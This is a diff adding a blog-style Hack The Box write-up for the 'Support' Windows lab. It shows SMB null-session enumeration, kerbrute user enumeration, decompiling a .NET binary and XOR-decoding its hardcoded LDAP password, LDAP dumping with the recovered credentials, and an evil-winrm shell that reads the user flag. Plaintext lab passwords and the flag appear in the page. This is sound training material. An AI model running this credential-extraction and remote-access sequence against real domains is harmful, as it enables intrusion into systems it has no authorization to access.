+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Pentesting mobile" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Pentesting mobile
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../setting-up-mobile-penstesting/" class="md-nav__link">
+        Setting up the mobile pentesting environment
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../todolist/" class="md-nav__link">
+        To-do list
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#about-the-machine" class="md-nav__link">
+    About the machine
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-usertxt-flag" class="md-nav__link">
+    Getting user.txt flag
+  </a>
+  
+    <nav class="md-nav" aria-label="Getting user.txt flag">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    Reconnaissance
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-port-enumeration" class="md-nav__link">
+    Service/ Port enumeration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumerate" class="md-nav__link">
+    Enumerate
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    Initial access
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-the-systems-flag" class="md-nav__link">
+    Getting the System's flag
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-in-this-lab" class="md-nav__link">
+    Tools in this lab
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-i-learned" class="md-nav__link">
+    What I learned
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+
+  <h1>support</h1>
+
+<h2 id="about-the-machine">About the machine</h2>
+<p><img alt="Support Machine Banner" src="../img/support.png" /></p>
+<table>
+<thead>
+<tr>
+<th>data</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Machine</td>
+<td>Support</td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>Hackthebox</td>
+</tr>
+<tr>
+<td>url</td>
+<td><a href="https://app.hackthebox.com/machines/Support">link</a></td>
+</tr>
+<tr>
+<td>creator</td>
+<td><a href="https://app.hackthebox.com/users/4935">0xdf</a></td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Windows</td>
+</tr>
+<tr>
+<td>Release data</td>
+<td>30 July 2022</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>Points</td>
+<td>20</td>
+</tr>
+<tr>
+<td>ip</td>
+<td>10.10.11.174</td>
+</tr>
+</tbody>
+</table>
+<h2 id="getting-usertxt-flag">Getting user.txt flag</h2>
+<p>Run:</p>
+<pre><code class="language-bash">export ip=10.10.11.174
+</code></pre>
+<h3 id="reconnaissance">Reconnaissance</h3>
+<h4 id="service-port-enumeration">Service/ Port enumeration</h4>
+<p>Run nmap to enumerate open ports, services, OS, and traceroute. Do a general enumeration not to make too much noise:</p>
+<pre><code class="language-bash">sudo nmap $ip -Pn
+</code></pre>
+<p>Results:</p>
+<pre><code>Nmap scan report for 10.10.11.174
+Host is up (0.034s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+
+Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
+</code></pre>
+<p>Once you know open ports, run nmap to see service versions and more details:   </p>
+<pre><code class="language-bash">sudo nmap -sCV -p3,88,135,139,389,445,464,593,636,3268,3269 $ip
+</code></pre>
+<p>Results:</p>
+<pre><code>Nmap scan report for 10.10.11.174
+Host is up (0.034s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-08 15:56:45Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2022-11-08T15:56:49
+|_  start_date: N/A
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 49.69 seconds
+zsh: segmentation fault  sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269 $ip
+</code></pre>
+<p>A few facts that you can gather after running this scan are:
++ There is a Windows Server running an Active Directory LDAP in the machine.
++ ldap and kerberos are available.
++ Domain: support.htb0.</p>
+<h4 id="enumerate">Enumerate</h4>
+<p>Now, we can perform some basic enumeration to gather data about the target.</p>
+<pre><code class="language-bash">enum4linux 10.10.11.174
+</code></pre>
+<p>Among the lines in the results, you can see these interesting lines:</p>
+<pre><code>=========================================( Target Information )=========================================
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+ ===================================( Session Check on 10.10.11.174 )===================================    
+[+] Server 10.10.11.174 allows sessions using username '', password ''
+
+================================( Getting domain SID for 10.10.11.174 )================================             
+Domain Name: SUPPORT                                                                     
+Domain Sid: S-1-5-21-1677581083-3380853377-188903654
+</code></pre>
+<p>Using the tool kerbrute, we will enumerate some valid usernames in the active directory:</p>
+<pre><code>(kali㉿kali)-[~/tools/kerbrute/dist]
+└─$ ./kerbrute_linux_amd64 userenum -d support --dc 10.10.11.174 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+</code></pre>
+<p>Results:</p>
+<pre><code>    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 11/09/22 - Ronnie Flathers @ropnop
+
+2022/11/09 05:16:54 &gt;  Using KDC(s):
+2022/11/09 05:16:54 &gt;   10.10.11.174:88
+
+2022/11/09 05:16:56 &gt;  [+] VALID USERNAME:  support@support
+2022/11/09 05:16:57 &gt;  [+] VALID USERNAME:  guest@support
+2022/11/09 05:17:03 &gt;  [+] VALID USERNAME:  administrator@support
+2022/11/09 05:17:52 &gt;  [+] VALID USERNAME:  Guest@support
+2022/11/09 05:17:53 &gt;  [+] VALID USERNAME:  Administrator@support
+2022/11/09 05:19:42 &gt;  [+] VALID USERNAME:  management@support
+2022/11/09 05:19:59 &gt;  [+] VALID USERNAME:  Support@support
+2022/11/09 05:20:52 &gt;  [+] VALID USERNAME:  GUEST@support
+2022/11/09 05:31:02 &gt;  [+] VALID USERNAME:  SUPPORT@support
+
+</code></pre>
+<p>The same thing we did with kerbrute, we could have done it with dnsrecon.</p>
+<p>Samba service is open so we can try to enumerate the shares provided by the host:</p>
+<pre><code class="language-bash"># -L looks at what services are available on a target and -N forces the tool not to ask for a password
+smbclient -L //$ip -N
+</code></pre>
+<p>Results:</p>
+<pre><code>        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        support-tools   Disk      support staff tools
+        SYSVOL          Disk      Logon server share
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre>
+<h3 id="initial-access">Initial access</h3>
+<p>After trying to connect to ADMIN$, C$, we connect to the share "support-tools":</p>
+<pre><code class="language-bash">smbclient /\\10.10.11.174/\support-tools
+</code></pre>
+<p>This way, we obtain a prompt command line in samba (smb: >). Typing help in that command line you can see which commands you can execute.</p>
+<p>Also, we list the content in the folder:</p>
+<pre><code class="language-smb">dir
+</code></pre>
+<p>Results:</p>
+<pre><code>smb: \&gt; dir
+  .                                   D        0  Wed Jul 20 13:01:06 2022
+  ..                                  D        0  Sat May 28 07:18:25 2022
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
+  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
+  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
+  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
+  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
+  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
+  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
+
+                4026367 blocks of size 4096. 968945 blocks available
+</code></pre>
+<p>Also, we check permissions on the share and we learn that we only have read permissions. Now we are going to retrieve all these files to pay close attention. Among the commands you can execute you have mget. So we run:</p>
+<pre><code class="language-smb">mget *
+</code></pre>
+<p>This will download all the files to the local folder from where you initiated your samba connection. Close the connection:</p>
+<pre><code class="language-smb">quit
+</code></pre>
+<p>Now, have a close look at the files we have downloaded. Unzip UserInfo.exe.zip file:</p>
+<pre><code class="language-bash">unzip UserInfo.exe.zip
+</code></pre>
+<p>After unzipping UserInfo.exe.zip, you have two files: UserInfo.exe and UserInfo.exe.config. Run:</p>
+<pre><code class="language-bash">cat UserInfo.exe.config
+</code></pre>
+<p>Result:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;configuration&gt;
+    &lt;startup&gt;
+        &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.8&quot; /&gt;
+    &lt;/startup&gt;
+  &lt;runtime&gt;
+    &lt;assemblyBinding xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt;
+      &lt;dependentAssembly&gt;
+        &lt;assemblyIdentity name=&quot;System.Runtime.CompilerServices.Unsafe&quot; publicKeyToken=&quot;b03f5f7f11d50a3a&quot; culture=&quot;neutral&quot; /&gt;
+        &lt;bindingRedirect oldVersion=&quot;0.0.0.0-6.0.0.0&quot; newVersion=&quot;6.0.0.0&quot; /&gt;
+      &lt;/dependentAssembly&gt;
+    &lt;/assemblyBinding&gt;
+  &lt;/runtime&gt;
+&lt;/configuration&gt;
+</code></pre>
+<p>From this, we can know that UserInfo.exe is a binary assembled with the .NETFramework. Basically, this executable appears to be used to pull user information, likely from Active Directory. Now, if we want to go further in our inspection we will need a .NET decompiler for Linux. Here we have several options.</p>
+<p>Since it's open source and we are using a kali virtual machine to perform this penetration test, let's use <a href="https://github.com/icsharpcode/ILSpy/">ILSpy</a>, but you can have a look at alternative tools at the end of this walkthrough. To run ILSpy, you need to install it before. Also, it has some dependencies like: .NET 6.0 SDK, Avalonia, dotnet... Install what you are asked and when done, run:</p>
+<pre><code class="language-bash">cd ~/tools/AvaloniaILSpy/artifacts/linux-x64
+./ILSpy
+</code></pre>
+<p>Open UserInfo.exe in the program and inspect the code. There are several parts in the code:</p>
+<ul>
+<li>References</li>
+<li>{}</li>
+<li>{} UserInfo</li>
+<li>{} UserInfo.Commands</li>
+<li>{} UserInfo.Services</li>
+</ul>
+<p>In the UserInfo.Services you can find the LdadQuery():</p>
+<p><img alt="ILSpy" src="https://github.com/amandaguglieri/walkthroughs/blob/main/resources/ilspy.png" /></p>
+<pre><code>using System.DirectoryServices;
+
+public LdapQuery()
+{
+    //IL_0018: Unknown result type (might be due to invalid IL or missing references)
+    //IL_0022: Expected O, but got Unknown
+    //IL_0035: Unknown result type (might be due to invalid IL or missing references)
+    //IL_003f: Expected O, but got Unknown
+    string password = Protected.getPassword();
+    entry = new DirectoryEntry(&quot;LDAP://support.htb&quot;, &quot;support\\ldap&quot;, password);
+    entry.set_AuthenticationType((AuthenticationTypes)1);
+    ds = new DirectorySearcher(entry);
+}
+</code></pre>
+<p>From where we stand, we can understand that LdapQuery() function is used to login into the Active Directory with the user "support". As a password, it calls the getPassword() function. Let's click on that function in the code to see it:</p>
+<pre><code>public static string getPassword()
+{
+    byte[] array = Convert.FromBase64String(enc_password);
+    byte[] array2 = array;
+    for (int i = 0; i &lt; array.Length; i++)
+    {
+        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
+    }
+    return Encoding.Default.GetString(array2);
+}
+</code></pre>
+<p>Here we can see the necessary steps that we will need to reverse the password if, in the end, we are able to retrieve it. Now, let's click on two function calls: "enc_password" and the private function "key".</p>
+<pre><code># enc_password function
+// UserInfo.Services.Protected
+using System.Text;
+
+private static string enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;
+</code></pre>
+<pre><code># private static byte[] key
+// UserInfo.Services.Protected
+using System.Text;
+
+private static byte[] key = Encoding.ASCII.GetBytes(&quot;armando&quot;);
+</code></pre>
+<p>With these two last elements, we can write a script to reverse the function getPassword() and ultimately obtain the password used for "support" user to access the Active Directory.</p>
+<p>Save the script as script.py and this content:</p>
+<pre><code class="language-python">import base64
+
+enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;
+key = b'armando'
+
+array = base64.b64decode(enc_password)
+array2 = ''
+for i in range(len(array)):
+    array2 += chr(array[i] ^ key[i%len(key)] ^ 223)
+
+print(array2)
+´´´
+
+Now, give script.py execution permissions and run it:
+
+```bash
+chmod +x script.py
+python script.py
+</code></pre>
+<p>Decrypted password would be: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</p>
+<p>Before going on, there is another way to get the password besides writing this python script. One of them, for instance, would involve:</p>
+<ol>
+<li>Opening a windows machine in the tun0 network range.</li>
+<li>Opening wireshark and capturing tun0 interface.</li>
+<li>Running the executable UserInfo.exe from the windows machine.</li>
+<li>Examining in wireshark the LDAP authentication packet (Follow TCP Stream in a request to port 389).</li>
+</ol>
+<p>Summing up, we have:</p>
+<ul>
+<li>user: support</li>
+<li>password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</li>
+<li>ldap directory: support.htb</li>
+</ul>
+<p>Now we can use a tool such as ldapsearch to open a connection to the LDAP server, bind, and perform a search using specified parameters, like:</p>
+<pre><code>-b searchbase   Use searchbase as the starting point for the search instead of the default.
+-x      Use simple authentication instead of SASL.
+-D binddn   Use the Distinguished Name binddn to bind to the LDAP directory.  For SASL binds, the server is expected to ignore this value.
+-w passwd       Use passwd as the password for simple authentication.
+-H ldapuri  Specify  URI(s)  referring  to  the  ldap  server(s); a list of URI, separated by whitespace or commas is expected
+</code></pre>
+<p>Using ldapsearch, we run:</p>
+<pre><code class="language-bash"># # ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b &quot;CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&quot;
+
+ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b &quot;CN=Users,DC=support,DC=htb&quot;
+</code></pre>
+<p>Results are long and provided in text form. By using a tool such as ldapdomaindump we can get cool results in different formats: .grep, .html, and .json.</p>
+<pre><code class="language-bash"> ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
+</code></pre>
+<p>Then, we can run:</p>
+<pre><code class="language-bash">firefox domain_users.html
+</code></pre>
+<p>Results:</p>
+<p><img alt="screenshot" src="https://github.com/amandaguglieri/walkthroughs/blob/main/resources/users-ldap.png" /></p>
+<p>It looks like the support user account has the most permissions. We have a closer look to this user in the results obtained in the ldapsearch:</p>
+<pre><code># support, Users, support.htb
+dn: CN=support,CN=Users,DC=support,DC=htb
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: support
+c: US
+l: Chapel Hill
+st: NC
+postalCode: 27514
+distinguishedName: CN=support,CN=Users,DC=support,DC=htb
+instanceType: 4
+whenCreated: 20220528111200.0Z
+whenChanged: 20221109173336.0Z
+uSNCreated: 12617
+info: Ironside47pleasure40Watchful
+memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+uSNChanged: 81981
+company: support
+streetAddress: Skipper Bowles Dr
+name: support
+objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132982099209777070
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: support
+sAMAccountType: 805306368
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
+dSCorePropagationData: 20220528111201.0Z
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 133124888166969633
+</code></pre>
+<p>There! Usually, the field "Info" is left empty but in this case, you can read: "Ironside47pleasure40Watchful", which might be a credential. Assuming that it is, we are going to enumerate user information in AD through the LDAP protocol. And for that, there exists a tool called evil-winrm.</p>
+<p><strong>What does evil-winrm do?</strong> evil-winrm is a WinRM shell for hacking/penthesting purposes.</p>
+<p><strong>And what is WinRM?</strong> WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators. <a href="https://github.com/Hackplayers/evil-winrm">Download evil-winrm repo here</a>.</p>
+<p>Run:</p>
+<pre><code class="language-bash">evil-winrm -i dc.support.htb -u support -p &quot;Ironside47pleasure40Watchful&quot;
+</code></pre>
+<p>And we will connect to a powershell terminal: PS C:\Users\support\Documents</p>
+<p>To get the user.txt flag, run:</p>
+<pre><code>cd ..
+dir
+cd Desktop
+dir
+type user.txt
+</code></pre>
+<p>Result:</p>
+<pre><code>561ec390613a0f53b431d3e14e923de6
+</code></pre>
+<h2 id="getting-the-systems-flag">Getting the System's flag</h2>
+<p>Coming soon.</p>
+<h2 id="tools-in-this-lab">Tools in this lab</h2>
+<p>Before going through this write-up, you may have a look at some tools needed to solve it in case you prefer to investigate them and try harder instead of reading directly the solution.</p>
+<p><strong>kerbrute</strong></p>
+<p>Created by ropnop. <a href="https://github.com/ropnop/kerbrute">Download repo</a>. A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication.</p>
+<p>Nicely done in go, so to install it first you need to make sure that go is installed. Otherwise, run:</p>
+<pre><code class="language-bash">sudo apt update &amp;&amp; sudo apt install golang
+</code></pre>
+<p>Then, follow the instructions from the repo.</p>
+<p><strong>enum4linux</strong></p>
+<p>Preinstalled in a kali machine. Tool to exploit null sessions by using some PERL scripts. Some cool commands here:</p>
+<p>enum4linux -S <target IP>     // enumerates shares
+enum4linux -U <target IP>     // enumerates users
+enum4linux -M <target IP>     // enumerates machine list
+enum4linux -enuP<target IP>   // displays the password policy in case you need to mount a network authentification attack
+enum4linux -u <target IP>     // specify username to use (default “”)
+enum4linux -p <target IP>     // specify password to use (default “”)
+enum4linux -s /usr/share/enum4linux/share-list.txt <target IP>    // Also you can use brute force by adding a file</p>
+<p><strong>dnspy</strong></p>
+<p>Created by a bunch of contributors. <a href="https://github.com/dnSpy/dnSpy">Download the repo</a>.
+dnSpy is a debugger and .NET assembly editor. You can use it to edit and debug assemblies even if you don't have any source code available. There is a but: this tool is for windows</p>
+<p>To install, open powershell in windows and run:</p>
+<pre><code class="language-PS">git clone --recursive https://github.com/dnSpy/dnSpy.git
+cd dnsSpy
+build.ps1 -NoMbuild
+</code></pre>
+<p><strong>ILSpy</strong></p>
+<p>Open source alternative for dnspy. <a href="https://github.com/icsharpcode/ILSpy/">Download from repo; ILSpy</a>. To install ILSpy, you need to install some dependencies like: .NET 6.0 SDK, Avalonia, dotnet... Install what you are asked and when done, run:</p>
+<pre><code class="language-bash">cd ~/tools/AvaloniaILSpy/artifacts/linux-x64
+./ILSpy
+</code></pre>
+<h2 id="what-i-learned">What I learned</h2>
+<p>When doing Support Machine I was faced with some challenging missions:</p>
+<p><strong>Enumerating shares as part of a Null session attack.</strong></p>
+<p>A null session attack exploits an authentification vulnerability for Windows Administrative Shares. This lets an attacker connect to a local or remote share without authentification. Therefore, it lets an attacker enumerate precious info such as passwords, system users, system groups, running system processes... The challenge here was to choose the best-suited tools to perform this enumeration. On my mental repo, I had:</p>
+<ul>
+<li>Samba suite</li>
+<li>Enum4linux</li>
+</ul>
+<p>But there is also a nmap script for smb enumeration.</p>
+<p><strong>Finding a .NET decompiler for Linux</strong></p>
+<p>There are well-known decompilers out there. For windows you have <a href="https://github.com/dnSpy/dnSpy">dnSpy</a> and many more. In linux you have the open source <a href="https://github.com/icsharpcode/ILSpy/">ILSpy</a>. BUT: Installation required some dependencies. There were more tools (wine).</p>
+<p><strong>Ldap enumerating tools</strong></p>
+<p>ldap-utils are preinstalled in kali, but before this lab, I didn't have had the chance to try them out.</p>
+<p><em>ldapsearch</em></p>
+<p>Syntax:</p>
+<pre><code>ldapsearch -x -H ldap://&lt;IP&gt; -D '&lt;DOMAIN&gt;\&lt;username&gt;' -w '&lt;password&gt;' -b &quot;CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&quot;
+</code></pre>
+<p>An example:</p>
+<pre><code class="language-bash">ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b &quot;CN=Users,DC=SUPPORT,DC=HTB&quot; | tee ldap_dc.support.htb.txt
+</code></pre>
+<p><em>ldapdomaindump</em></p>
+<p>I have enjoyed this tool for real! It's pretty straightforward and you get legible results. An example of how to run it:</p>
+<pre><code class="language-bash">ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
+</code></pre>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "content.code.annotate", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.e5c33ebb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.ba449ae6.min.js"></script>
+      
+    
+  </body>
+</html>
